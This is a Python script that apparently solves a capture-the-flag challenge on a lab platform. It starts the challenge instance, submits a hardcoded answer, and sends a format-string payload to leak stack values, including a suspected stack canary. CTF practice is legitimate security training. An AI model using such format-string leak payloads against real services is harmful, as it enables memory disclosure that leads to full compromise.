import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

ANSWER = -2623
cy = CyLab(delay=1.0)
cy.login()
cy.req("PUT", "/api/challenges/89/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/89/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
s = socket.create_connection((host, port), timeout=20)
s.settimeout(8)
time.sleep(0.4)
try:
    s.recv(8192)
except Exception:
    pass
s.sendall(f"{ANSWER}\n".encode())
time.sleep(0.6)
try:
    s.recv(8192)
except Exception:
    pass
# chaine courte : canari suppose en 135, plus quelques voisins
fmt = "%2$p|%133$p|%134$p|%135$p|%136$p|%137$p"
s.sendall((fmt + "\n").encode())
time.sleep(1.2)
res = b""
try:
    while True:
        c = s.recv(65536)
        if not c:
            break
        res += c
except Exception:
    pass
txt = res.decode("utf-8", "replace")
print("=== LEAK COURT ===")
print(txt[:600])
s.close()
